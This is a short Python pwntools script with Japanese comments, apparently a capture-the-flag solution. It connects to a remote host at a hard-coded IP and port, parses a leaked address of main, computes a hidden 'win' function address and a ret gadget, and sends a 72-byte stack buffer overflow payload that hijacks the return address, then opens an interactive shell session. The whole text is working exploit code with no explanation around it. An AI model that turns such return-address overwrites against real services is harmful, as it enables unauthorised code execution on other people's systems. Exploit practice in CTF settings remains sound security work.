from pwn import *

# 接続先
io = remote('34.170.146.252', 19295)

# 1. mainのアドレスを取得
io.recvuntil(b"address of main function: ")
main_addr = int(io.recvline().strip(), 16)
log.info(f"Leaked main address: {hex(main_addr)}")

# 2. オフセットの計算 (手元の nm コマンドの結果を反映させてください)
# 例: main が 0x11a9, winが 0x1191 なら 差は 0x18
win_addr = main_addr - 0x24

# 3. ret ガジェット (スタックアライメント用)
ret_gadget = main_addr - 0x1e6

log.info(f"Target win address:  {hex(win_addr)}")
log.info(f"Target ret gadget:   {hex(ret_gadget)}")

# 4. ペイロード作成
# buffer(64) + RBP(8) = 72 bytes
payload = b"A" * 72
payload += p64(ret_gadget)
payload += p64(win_addr)

# 5. 送信
io.sendlineafter(b"input > ", payload)

# 6. インタラクティブモード (シェル操作)
io.interactive()
